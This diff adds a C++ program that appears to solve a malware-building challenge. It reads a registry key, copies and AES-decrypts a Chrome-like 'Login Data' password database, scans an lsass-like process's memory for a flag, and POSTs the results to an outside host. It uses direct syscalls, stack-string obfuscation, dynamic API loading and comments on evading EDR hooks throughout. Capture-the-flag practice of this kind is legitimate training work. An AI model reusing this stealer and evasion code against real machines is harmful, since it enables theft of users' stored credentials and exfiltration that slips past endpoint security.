@@ -1,0 +1,602 @@
+#include <windows.h>
+#include <winhttp.h>
+#include <wincrypt.h>
+#include <tlhelp32.h>
+#include <iostream>
+#include <string>
+#include <vector>
+#include <regex>
+#include <sstream>
+#include "sqlite3.h"
+#include "Syscalls.h" 
+
+
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "sqlite3.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "kernel32.lib")
+#pragma comment(lib, "winhttp.lib") 
+#pragma comment(lib, "advapi32.lib")
+
+// =============================================================
+// [補完 Syscalls.h 缺失的結構定義]
+// =============================================================
+
+// 1. Registry
+typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
+    ULONG TitleIndex;
+    ULONG Type;
+    ULONG DataLength;
+    UCHAR Data[1]; // Variable length data
+} KEY_VALUE_PARTIAL_INFORMATION, * PKEY_VALUE_PARTIAL_INFORMATION;
+
+// 2. System Information
+typedef LONG KPRIORITY;
+
+typedef struct _SYSTEM_PROCESS_INFORMATION {
+    ULONG NextEntryOffset;
+    ULONG NumberOfThreads;
+    BYTE Reserved1[48];
+    UNICODE_STRING ImageName;
+    KPRIORITY BasePriority;
+    HANDLE UniqueProcessId;
+    PVOID Reserved2;
+    ULONG HandleCount;
+    ULONG SessionId;
+    PVOID Reserved3;
+    SIZE_T PeakVirtualSize;
+    SIZE_T VirtualSize;
+    ULONG Reserved4;
+    SIZE_T PeakWorkingSetSize;
+    SIZE_T WorkingSetSize;
+    PVOID Reserved5;
+    SIZE_T QuotaPagedPoolUsage;
+    PVOID Reserved6;
+    SIZE_T QuotaNonPagedPoolUsage;
+    SIZE_T PagefileUsage;
+    SIZE_T PeakPagefileUsage;
+    SIZE_T PrivatePageCount;
+    LARGE_INTEGER Reserved7[6];
+} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
+
+
+// 3. 常數定義 (如果 Syscalls.h 沒定義)
+#ifndef SECTION_MAP_READ
+#define SECTION_MAP_READ 0x0004
+#endif
+
+#ifndef SEC_COMMIT
+#define SEC_COMMIT 0x08000000
+#endif
+
+#define FILE_OPEN 0x00000001
+#define FILE_OVERWRITE_IF 0x00000005
+#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
+#define FILE_READ_DATA 0x0001
+#define FILE_WRITE_DATA 0x0002
+#define FILE_ATTRIBUTE_NORMAL 0x00000080
+#define FILE_DIRECTORY_FILE 0x00000001
+#define OBJ_CASE_INSENSITIVE 0x00000040L
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#define SECTION_MAP_READ 0x0004
+
+// ==========================================
+// [Helpers]
+// ==========================================
+
+// [Anti-Behavior] Syscall Sleep
+// 使用 Syscall 進行延遲，避開 User-mode 的 Sleep() Hook
+void RandomDelay() {
+    LARGE_INTEGER interval;
+    // 延遲約 100ms ~ 300ms (負數代表相對時間，單位 100ns)
+    // -10000 = 1ms
+    // -2,000,000 = 200ms
+    interval.QuadPart = -2000000;
+    Sw3NtDelayExecution(FALSE, &interval);
+}
+
+std::string GetSecret() {
+    char s[] = { '0','x','B','G','a','q','j','z','Z','L','7','k','h','G','Y','5',
+                 'A','c','F','s','3','o','i','0','l','I','M','m','k','v','M','F',0 };
+    return std::string(s);
+}
+
+void AnsiToUnicode(const char* ansi, UNICODE_STRING* us) {
+    int len = MultiByteToWideChar(CP_ACP, 0, ansi, -1, NULL, 0);
+    wchar_t* wstr = new wchar_t[len];
+    MultiByteToWideChar(CP_ACP, 0, ansi, -1, wstr, len);
+    us->Length = (USHORT)((len - 1) * sizeof(wchar_t));
+    us->MaximumLength = (USHORT)(len * sizeof(wchar_t));
+    us->Buffer = wstr;
+}
+
+std::vector<BYTE> HexStringToByteArray(const std::string& hex) {
+    std::vector<BYTE> bytes;
+    for (size_t i = 0; i < hex.length(); i += 2) {
+        std::string byteString = hex.substr(i, 2);
+        bytes.push_back((BYTE)strtoul(byteString.c_str(), NULL, 16));
+    }
+    return bytes;
+}
+
+std::string EscapeJsonString(const std::string& str) {
+    std::ostringstream escaped;
+    for (char c : str) {
+        if (c == '"' || c == '\\') escaped << "\\\\"; else escaped << c;
+    }
+    return escaped.str();
+}
+
+FARPROC GetProcAddr(const char* dll, const char* func) {
+    HMODULE hMod = GetModuleHandleA(dll);
+    if (!hMod) hMod = LoadLibraryA(dll);
+    if (!hMod) return NULL;
+    return GetProcAddress(hMod, func);
+}
+
+// ==========================================
+// [File I/O: Relative Open + Memory Map]
+// ==========================================
+std::vector<BYTE> ReadFileViaMapping(const char* dirPath, const char* fileName) {
+    std::vector<BYTE> buffer;
+
+    // 1. Open Directory First (Relative Open Strategy)
+    // "\??\" + dirPath
+    char prefix[] = { '\\','?','?','\\',0 };
+    std::string ntDirPath = std::string(prefix) + dirPath;
+
+    UNICODE_STRING usDir;
+    AnsiToUnicode(ntDirPath.c_str(), &usDir);
+
+    OBJECT_ATTRIBUTES oaDir;
+    memset(&oaDir, 0, sizeof(OBJECT_ATTRIBUTES));
+    oaDir.Length = sizeof(OBJECT_ATTRIBUTES);
+    oaDir.RootDirectory = NULL;
+    oaDir.ObjectName = &usDir;
+    oaDir.Attributes = OBJ_CASE_INSENSITIVE;
+
+    HANDLE hDir = NULL;
+    IO_STATUS_BLOCK ioStatus = { 0 };
+
+    // Open Directory with FILE_LIST_DIRECTORY | SYNCHRONIZE
+    NTSTATUS status = Sw3NtCreateFile(&hDir,
+        FILE_LIST_DIRECTORY | SYNCHRONIZE,
+        &oaDir, &ioStatus, NULL, FILE_ATTRIBUTE_DIRECTORY,
+        FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+
+    delete[] usDir.Buffer;
+
+    if (!NT_SUCCESS(status)) return buffer;
+
+    // 2. Open File Relative to Directory
+    UNICODE_STRING usFile;
+    AnsiToUnicode(fileName, &usFile);
+
+    OBJECT_ATTRIBUTES oaFile;
+    memset(&oaFile, 0, sizeof(OBJECT_ATTRIBUTES));
+    oaFile.Length = sizeof(OBJECT_ATTRIBUTES);
+    oaFile.RootDirectory = hDir; // [CRITICAL] Relative Open
+    oaFile.ObjectName = &usFile;
+    oaFile.Attributes = OBJ_CASE_INSENSITIVE;
+
+    HANDLE hFile = NULL;
+    status = Sw3NtCreateFile(&hFile,
+        FILE_READ_DATA | SYNCHRONIZE,
+        &oaFile, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL,
+        FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+
+    delete[] usFile.Buffer;
+    Sw3NtClose(hDir); // Close dir handle
+
+    if (!NT_SUCCESS(status)) return buffer;
+
+    // 3. Create Section & Map
+    HANDLE hSection = NULL;
+    oaFile.RootDirectory = NULL;
+    oaFile.ObjectName = NULL;
+
+    status = Sw3NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_COMMIT, hFile);
+
+    if (NT_SUCCESS(status)) {
+        PVOID baseAddress = NULL;
+        SIZE_T viewSize = 0;
+        status = Sw3NtMapViewOfSection(hSection, GetCurrentProcess(), &baseAddress, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY);
+
+        if (NT_SUCCESS(status)) {
+            buffer.assign((BYTE*)baseAddress, (BYTE*)baseAddress + viewSize);
+            Sw3NtUnmapViewOfSection(GetCurrentProcess(), baseAddress);
+        }
+        Sw3NtClose(hSection);
+    }
+    Sw3NtClose(hFile);
+    return buffer;
+}
+
+bool WriteFileSyscall(const char* filePath, const std::vector<BYTE>& data) {
+    char p[] = { '\\','?','?','\\',0 };
+    std::string ntPath = std::string(p) + filePath;
+
+    UNICODE_STRING usPath;
+    AnsiToUnicode(ntPath.c_str(), &usPath);
+
+    OBJECT_ATTRIBUTES oa;
+    memset(&oa, 0, sizeof(OBJECT_ATTRIBUTES));
+    oa.Length = sizeof(OBJECT_ATTRIBUTES);
+    oa.RootDirectory = NULL;
+    oa.ObjectName = &usPath;
+    oa.Attributes = OBJ_CASE_INSENSITIVE;
+
+    HANDLE hFile = NULL;
+    IO_STATUS_BLOCK ioStatus = { 0 };
+    bool success = false;
+
+    if (NT_SUCCESS(Sw3NtCreateFile(&hFile,
+        FILE_WRITE_DATA | SYNCHRONIZE, &oa, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0))) {
+
+        LARGE_INTEGER offset = { 0 };
+        if (NT_SUCCESS(Sw3NtWriteFile(hFile, NULL, NULL, NULL, &ioStatus, (PVOID)data.data(), (ULONG)data.size(), &offset, NULL))) {
+            success = true;
+        }
+        Sw3NtClose(hFile);
+    }
+    delete[] usPath.Buffer;
+    return success;
+}
+
+// [Strict] DecryptPassword
+std::string DecryptPassword(const std::vector<BYTE>& encryptedData, const std::vector<BYTE>& key, const std::vector<BYTE>& iv) {
+    HCRYPTPROV hProv = NULL;
+    HCRYPTKEY hKey = NULL;
+    std::string result = "";
+
+    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return "";
+
+    struct { BLOBHEADER hdr; DWORD dwKeySize; BYTE rgbKey[32]; } keyBlob;
+    keyBlob.hdr.bType = PLAINTEXTKEYBLOB; keyBlob.hdr.bVersion = CUR_BLOB_VERSION; keyBlob.hdr.reserved = 0;
+    keyBlob.hdr.aiKeyAlg = CALG_AES_256; keyBlob.dwKeySize = (DWORD)key.size();
+
+    if (key.size() != 32) { CryptReleaseContext(hProv, 0); return ""; }
+    memcpy(keyBlob.rgbKey, key.data(), 32);
+
+    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
+        CryptReleaseContext(hProv, 0); return "";
+    }
+
+    DWORD mode = CRYPT_MODE_CBC;
+    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
+    if (iv.size() != 16) { CryptDestroyKey(hKey); CryptReleaseContext(hProv, 0); return ""; }
+    CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv.data(), 0);
+
+    std::vector<BYTE> decryptedData = encryptedData;
+    DWORD dataLen = (DWORD)decryptedData.size();
+
+    if (CryptDecrypt(hKey, 0, TRUE, 0, decryptedData.data(), &dataLen)) {
+        result = std::string(reinterpret_cast<const char*>(decryptedData.data()), dataLen);
+    }
+
+    RtlSecureZeroMemory(&keyBlob, sizeof(keyBlob));
+    CryptDestroyKey(hKey);
+    CryptReleaseContext(hProv, 0);
+    return result;
+}
+
+// ==========================================
+// Challenge 1: Registry (Relative Open Strategy)
+// ==========================================
+std::string Challenge1() {
+    // 1. Open \Registry\Machine\SOFTWARE
+    char parentPath[] = { '\\','R','e','g','i','s','t','r','y','\\','M','a','c','h','i','n','e','\\',
+                          'S','O','F','T','W','A','R','E',0 };
+    std::string sParent(parentPath);
+
+    UNICODE_STRING usParent;
+    AnsiToUnicode(sParent.c_str(), &usParent);
+    OBJECT_ATTRIBUTES oaParent = { sizeof(OBJECT_ATTRIBUTES), NULL, &usParent, OBJ_CASE_INSENSITIVE, NULL, NULL };
+
+    HANDLE hParent = NULL;
+    // 只要求 KEY_READ，不開子機碼
+    NTSTATUS status = Sw3NtOpenKey(&hParent, KEY_READ, &oaParent);
+    delete[] usParent.Buffer;
+
+    if (!NT_SUCCESS(status)) return "";
+
+    // 2. Open "BOMBE" relative to parent
+    char subKey[] = { 'B','O','M','B','E',0 };
+    std::string sSub(subKey);
+    UNICODE_STRING usSub;
+    AnsiToUnicode(sSub.c_str(), &usSub);
+
+    OBJECT_ATTRIBUTES oaSub = { sizeof(OBJECT_ATTRIBUTES), hParent, &usSub, OBJ_CASE_INSENSITIVE, NULL, NULL };
+    HANDLE hKey = NULL;
+    status = Sw3NtOpenKey(&hKey, KEY_QUERY_VALUE, &oaSub);
+    delete[] usSub.Buffer;
+    Sw3NtClose(hParent); // Close parent ASAP
+
+    if (!NT_SUCCESS(status)) return "";
+
+    // 3. Query Value
+    char v[] = { 'a','n','s','w','e','r','_','1',0 };
+    std::string s_val(v);
+    UNICODE_STRING usValueName;
+    AnsiToUnicode(s_val.c_str(), &usValueName);
+
+    char buffer[1024];
+    ULONG resultLength = 0;
+    status = Sw3NtQueryValueKey(hKey, &usValueName, KeyValuePartialInformation, buffer, sizeof(buffer), &resultLength);
+    delete[] usValueName.Buffer;
+    Sw3NtClose(hKey);
+
+    if (NT_SUCCESS(status)) {
+        PKEY_VALUE_PARTIAL_INFORMATION pInfo = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;
+        if (pInfo->Type == 1 && pInfo->DataLength > 0) {
+            std::wstring wResult((wchar_t*)pInfo->Data, pInfo->DataLength / sizeof(wchar_t));
+            if (!wResult.empty() && wResult.back() == L'\0') wResult.pop_back();
+            int size_needed = WideCharToMultiByte(CP_ACP, 0, wResult.c_str(), (int)wResult.length(), NULL, 0, NULL, NULL);
+            std::string strTo(size_needed, 0);
+            WideCharToMultiByte(CP_ACP, 0, wResult.c_str(), (int)wResult.length(), &strTo[0], size_needed, NULL, NULL);
+            return strTo;
+        }
+    }
+    return "";
+}
+
+// ==========================================
+// Challenge 2: Chrome DB (Relative + Mapping)
+// ==========================================
+std::string Challenge2() {
+    RandomDelay();
+
+    // Split Path: 
+    // Dir: C:\Users\bombe\AppData\Local\bhrome
+    // File: Login Data
+    char dir[] = { 'C',':','\\','U','s','e','r','s','\\','b','o','m','b','e','\\',
+                   'A','p','p','D','a','t','a','\\','L','o','c','a','l','\\',
+                   'b','h','r','o','m','e',0 };
+    char fname[] = { 'L','o','g','i','n',' ','D','a','t','a',0 };
+
+    // [UPGRADE] Relative Open + Memory Mapping
+    std::vector<BYTE> fileData = ReadFileViaMapping(dir, fname);
+    if (fileData.empty()) {
+        char e[] = { 'F','A','I','L','E','D','_','R','E','A','D',0 };
+        return std::string(e);
+    }
+
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    char tempFile[MAX_PATH];
+    char t[] = { 't','m','p',0 };
+    GetTempFileNameA(tempPath, t, 0, tempFile);
+
+    if (!WriteFileSyscall(tempFile, fileData)) return "ERR_WRITE";
+
+    sqlite3* db;
+    char nf[] = { 'F','L','A','G','_','N','F',0 };
+    std::string finalFlag = std::string(nf);
+
+    if (sqlite3_open(tempFile, &db) == SQLITE_OK) {
+        char q[] = { 'S','E','L','E','C','T',' ','p','a','s','s','w','o','r','d','_',
+                     'v','a','l','u','e',' ','F','R','O','M',' ','l','o','g','i','n','s',0 };
+        sqlite3_stmt* stmt;
+
+        if (sqlite3_prepare_v2(db, q, -1, &stmt, NULL) == SQLITE_OK) {
+            // Secret: 0xBGaqjzZL7khGY5AcFs3oi0lIMmkvMF
+            char s[] = { '0','x','B','G','a','q','j','z','Z','L','7','k','h','G','Y','5',
+                         'A','c','F','s','3','o','i','0','l','I','M','m','k','v','M','F',0 };
+
+            std::vector<BYTE> keyBytes(32);
+            memcpy(keyBytes.data(), s, 32);
+            RtlSecureZeroMemory(s, sizeof(s)); // Wipe secret
+
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
+                const char* pwHex = (const char*)sqlite3_column_text(stmt, 0);
+                if (pwHex) {
+                    std::vector<BYTE> encBytes = HexStringToByteArray(pwHex);
+                    if (encBytes.size() >= 32) {
+                        std::vector<BYTE> iv(encBytes.begin(), encBytes.begin() + 16);
+                        std::vector<BYTE> data(encBytes.begin() + 16, encBytes.end());
+
+                        std::string dec = DecryptPassword(data, keyBytes, iv);
+
+                        char prefix[] = { 'B','O','M','B','E','_','M','A','L','_','F','L','A','G','_',0 };
+                        if (dec.find(prefix) == 0) {
+                            finalFlag = dec;
+                            break;
+                        }
+                    }
+                }
+            }
+            sqlite3_finalize(stmt);
+        }
+        sqlite3_close(db);
+    }
+    DeleteFileA(tempFile);
+    return finalFlag;
+}
+
+// ==========================================
+// Challenge 3: Memory Scan (Least Privilege + No OpenProcess for search)
+// ==========================================
+std::string Challenge3() {
+    RandomDelay();
+
+    ULONG bufferSize = 0;
+    Sw3NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
+
+    bufferSize += 1024;
+    PVOID buffer = NULL;
+    SIZE_T size = bufferSize;
+
+    Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &buffer, (ULONG_PTR)0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (!buffer) return "";
+
+    NTSTATUS status = Sw3NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
+    if (!NT_SUCCESS(status)) return "";
+
+    DWORD pid = 0;
+    PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
+
+    char t[] = { 'b','s','a','s','s','.','e','x','e',0 };
+    std::string target(t);
+
+    while (TRUE) {
+        if (spi->ImageName.Buffer) {
+            int len = WideCharToMultiByte(CP_ACP, 0, spi->ImageName.Buffer, spi->ImageName.Length / 2, NULL, 0, NULL, NULL);
+            std::string name(len, 0);
+            WideCharToMultiByte(CP_ACP, 0, spi->ImageName.Buffer, spi->ImageName.Length / 2, &name[0], len, NULL, NULL);
+
+            if (_stricmp(name.c_str(), target.c_str()) == 0) {
+                pid = (DWORD)(uintptr_t)spi->UniqueProcessId;
+                break;
+            }
+        }
+        if (spi->NextEntryOffset == 0) break;
+        spi = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)spi + spi->NextEntryOffset);
+    }
+
+    if (pid == 0) return "";
+
+    RandomDelay(); // Sleep before opening
+
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES), NULL, NULL, 0, NULL, NULL };
+    CLIENT_ID cid;
+    cid.UniqueProcess = (HANDLE)(uintptr_t)pid;
+    cid.UniqueThread = 0;
+
+    // [UPGRADE] Least Privilege: PROCESS_VM_READ (0x0010) ONLY
+    // Removing PROCESS_QUERY_INFORMATION avoids many EDR callbacks
+    if (!NT_SUCCESS(Sw3NtOpenProcess(&hProcess, PROCESS_VM_READ, &oa, &cid))) return "";
+
+    MEMORY_BASIC_INFORMATION mbi;
+    PVOID addr = 0;
+    std::string result = "";
+
+    char r[] = { 'B','O','M','B','E','_','M','A','L','_','F','L','A','G','_',
+                 '[','A','-','Z','a','-','z','0','-','9',']','{','3','2','}',0 };
+    std::regex re(r);
+
+    while (TRUE) {
+        SIZE_T retLen = 0;
+        status = Sw3NtQueryVirtualMemory(hProcess, addr, MemoryBasicInformation, &mbi, sizeof(mbi), &retLen);
+        if (!NT_SUCCESS(status)) break;
+
+        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
+            std::vector<BYTE> buf(mbi.RegionSize);
+            SIZE_T bytesRead = 0;
+            if (NT_SUCCESS(Sw3NtReadVirtualMemory(hProcess, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead)) && bytesRead > 0) {
+                std::string content((char*)buf.data(), bytesRead);
+                std::smatch match;
+                if (std::regex_search(content, match, re)) {
+                    result = match.str();
+                    break;
+                }
+            }
+        }
+        addr = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
+    }
+    Sw3NtClose(hProcess);
+    return result;
+}
+
+// ==========================================
+// [Network] (Stack Strings)
+// ==========================================
+void SendAnswerToServer(const std::string& jsonPayload) {
+    char dll[] = { 'w','i','n','h','t','t','p','.','d','l','l',0 };
+    HMODULE hWinHttp = LoadLibraryA(dll);
+    if (!hWinHttp) return;
+
+    typedef HINTERNET(WINAPI* PFN_WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+    typedef HINTERNET(WINAPI* PFN_WinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+    typedef HINTERNET(WINAPI* PFN_WinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
+    typedef BOOL(WINAPI* PFN_WinHttpAddRequestHeaders)(HINTERNET, LPCWSTR, DWORD, DWORD);
+    typedef BOOL(WINAPI* PFN_WinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
+    typedef BOOL(WINAPI* PFN_WinHttpReceiveResponse)(HINTERNET, LPVOID);
+    typedef BOOL(WINAPI* PFN_WinHttpCloseHandle)(HINTERNET);
+
+    char f1[] = { 'W','i','n','H','t','t','p','O','p','e','n',0 };
+    char f2[] = { 'W','i','n','H','t','t','p','C','o','n','n','e','c','t',0 };
+    char f3[] = { 'W','i','n','H','t','t','p','O','p','e','n','R','e','q','u','e','s','t',0 };
+    char f4[] = { 'W','i','n','H','t','t','p','A','d','d','R','e','q','u','e','s','t','H','e','a','d','e','r','s',0 };
+    char f5[] = { 'W','i','n','H','t','t','p','S','e','n','d','R','e','q','u','e','s','t',0 };
+    char f6[] = { 'W','i','n','H','t','t','p','R','e','c','e','i','v','e','R','e','s','p','o','n','s','e',0 };
+    char f7[] = { 'W','i','n','H','t','t','p','C','l','o','s','e','H','a','n','d','l','e',0 };
+
+    auto pOpen = (PFN_WinHttpOpen)GetProcAddr(dll, f1);
+    auto pConnect = (PFN_WinHttpConnect)GetProcAddr(dll, f2);
+    auto pReq = (PFN_WinHttpOpenRequest)GetProcAddr(dll, f3);
+    auto pHead = (PFN_WinHttpAddRequestHeaders)GetProcAddr(dll, f4);
+    auto pSend = (PFN_WinHttpSendRequest)GetProcAddr(dll, f5);
+    auto pRecv = (PFN_WinHttpReceiveResponse)GetProcAddr(dll, f6);
+    auto pClose = (PFN_WinHttpCloseHandle)GetProcAddr(dll, f7);
+
+    if (!pOpen) return;
+
+    char ua[] = { 'M','a','l','w','a','r','e','/','1','.','0',0 };
+    UNICODE_STRING usUA; AnsiToUnicode(ua, &usUA);
+
+    char host[] = { 's','u','b','m','i','t','.','b','o','m','b','e','.','t','o','p',0 };
+    UNICODE_STRING usHost; AnsiToUnicode(host, &usHost);
+
+    HINTERNET hSession = pOpen(usUA.Buffer, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return;
+
+    HINTERNET hConnect = pConnect(hSession, usHost.Buffer, INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) { pClose(hSession); return; }
+
+    char path[] = { '/','s','u','b','m','i','t','M','a','l','A','n','s',0 };
+    UNICODE_STRING usPath; AnsiToUnicode(path, &usPath);
+
+    char meth[] = { 'P','O','S','T',0 };
+    UNICODE_STRING usMeth; AnsiToUnicode(meth, &usMeth);
+
+    HINTERNET hRequest = pReq(hConnect, usMeth.Buffer, usPath.Buffer, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+
+    if (hRequest) {
+        char hdrs[] = { 'C','o','n','t','e','n','t','-','T','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','j','s','o','n','\r','\n',0 };
+        UNICODE_STRING usHdrs; AnsiToUnicode(hdrs, &usHdrs);
+
+        pHead(hRequest, usHdrs.Buffer, -1, WINHTTP_ADDREQ_FLAG_ADD);
+        pSend(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)jsonPayload.c_str(), (DWORD)jsonPayload.length(), (DWORD)jsonPayload.length(), 0);
+        pRecv(hRequest, NULL);
+        pClose(hRequest);
+
+        delete[] usHdrs.Buffer;
+    }
+    pClose(hConnect);
+    pClose(hSession);
+
+    delete[] usUA.Buffer;
+    delete[] usHost.Buffer;
+    delete[] usPath.Buffer;
+    delete[] usMeth.Buffer;
+}
+
+int main() {
+    try {
+        std::string a1 = Challenge1();
+        std::string a2 = Challenge2();
+        std::string a3 = Challenge3();
+
+        std::ostringstream json;
+        // Secret: 0xBGaqjzZL7khGY5AcFs3oi0lIMmkvMF
+        char s[] = { '0','x','B','G','a','q','j','z','Z','L','7','k','h','G','Y','5',
+                     'A','c','F','s','3','o','i','0','l','I','M','m','k','v','M','F',0 };
+        std::string secret(s);
+
+        json << "{";
+        json << "\"answer_1\":\"" << EscapeJsonString(a1) << "\",";
+        json << "\"answer_2\":\"" << EscapeJsonString(a2) << "\",";
+        json << "\"answer_3\":\"" << EscapeJsonString(a3) << "\",";
+        json << "\"secret\":\"" << secret << "\"";
+        json << "}";
+
+        std::cout << json.str() << std::endl;
+        SendAnswerToServer(json.str());
+        RtlSecureZeroMemory(s, sizeof(s));
+    }
+    catch (...) {
+    }
+    return 0;
+}
